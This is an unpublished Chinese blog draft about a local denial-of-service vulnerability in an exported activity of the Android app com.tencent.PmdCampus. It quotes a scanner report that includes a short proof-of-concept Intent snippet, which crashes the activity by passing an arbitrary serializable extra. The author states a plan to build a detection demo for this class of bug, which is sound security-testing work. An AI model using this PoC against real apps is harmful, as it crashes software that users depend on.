---
layout: post
title: "本地拒绝服务"
date: 2016-02-03 20:28:06 +0800
comments: true
categories: android
published: false
---

```
[中危系统组件本地拒绝服务漏洞检测]
问题详情: com.tencent.PmdCampus.view.order.activity.OrderDetailTakerActivity { 利用代码片段(poc): 
Intent intent=new Intent();
intent.setComponent(new ComponentName("com.tencent.PmdCampus", "com.tencent.PmdCampus.view.order.activity.OrderDetailTakerActivity"));
intent.putExtra("anykey",new AnySerializableClass());
startActivity(intent); }

```

自己写一个demo用于检测这种漏洞，要求有一定的易用性

